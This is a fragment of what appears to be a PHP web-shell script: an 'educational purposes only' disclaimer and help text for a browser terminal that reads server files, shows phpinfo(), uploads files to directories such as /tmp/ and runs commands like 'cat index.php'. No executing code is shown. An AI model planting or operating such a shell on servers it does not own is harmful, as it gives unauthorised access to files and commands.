...
/* 
  ...
  This script is for educational purposes only. NEVER upload this script to a server that you
  do not explicity own. YOU are responsible for anything you do with this script.

  You are free to use, share, and expand this script to your heart's content, as long as it is
  for legal use and you give credit in some way. You are not allowed to use this script to attack 
  others.
                ...
                <fieldset>
                    <div id="terminal-wrapper">
                        <p id="terminal">
                            ...
                            <span style="color: white;">open &lt;file&gt;</span> - Opens file in new window. Displayed
                            as plain text.
                            <span style="color: white;">open /phpinfo</span> - Displays phpinfo() instead of file in new
                            window.
                            <span style="color: white;">upload &lt;dir&gt;</span> - Uploads attached file to directory.
                            Ex: upload /tmp/
                            <span style="color: white;">less &lt;command&gt;</span> - q to quit, space to page down. Ex:
                            less cat index.php
                            <span style="color: white;">lessl &lt;command&gt;</span> - less with line numbers. Ex: lessl
                            cat index.php
                            ===================================================================================
